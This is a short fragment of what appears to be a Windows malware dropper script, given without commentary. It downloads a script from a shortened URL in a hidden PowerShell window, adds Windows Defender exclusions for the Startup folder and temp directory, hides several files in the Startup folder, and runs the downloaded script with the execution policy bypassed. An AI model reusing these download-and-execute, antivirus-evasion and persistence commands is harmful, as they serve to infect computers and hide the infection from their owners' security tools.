...
powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri 'http://tiny.cc/94cg001' -UseBasicParsing -OutFile edpnotify.ps1"; Add-MpPreference -ExclusionPath 'C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'; Add-MpPreference -ExclusionPath '$env:temp'


attrib +h "%STARTUP%/nEQlCzTBpDrO.bat"
attrib +h "%STARTUP%/AmJOwiWzUEbZ.ps1"
attrib +h "%STARTUP%/edpnotify.ps1"
...
powershell powershell.exe -windowstyle hidden -ep bypass "./edpnotify.ps1"
